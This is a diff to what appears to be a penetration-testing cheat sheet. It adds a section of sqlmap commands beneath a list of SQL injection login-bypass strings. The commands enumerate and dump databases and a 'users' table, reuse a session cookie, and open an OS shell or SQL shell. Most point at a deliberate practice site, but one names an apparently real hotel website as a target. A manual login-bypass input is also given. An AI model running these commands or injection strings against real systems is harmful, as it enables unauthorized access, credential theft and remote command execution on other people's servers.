@@ -271,7 +271,43 @@ admin'/*
 ') or '1'='1--
 ') or ('1'='1—
 ```
+
+
+SQLMAP
+
+```shell
+* For finding DBs:
+sqlmap -u "------/id=1" --dbs --batch
+sqlmap -u "https://bliss-hotel.000webhostapp.com/room_details.php?room_type_id=RM101" --dbs --batch
+
+* Find DBs 
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs --batch
+
+* Find Tables =
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --table --batch
+
+* Find columns = 
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --columns --batch
+
+* Dump table =
+ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users --dump --batch
+
+* Dump the DB =
+ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart --dump-all --batch
+
+* Using cookies : 
+sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch
+
+* manual SQL Injection
+in login page enter blah' or 1=1-- as username and click login without entering the password
+
+* GET access of OS Shell = 
+sqlmap -u 'url' --dbms=mysql --os-shell SQL Shell = sqlmap -u 'url' --dbms=mysql --sql-shell
+```
+
 </details>
+</details>
+
 
 
 
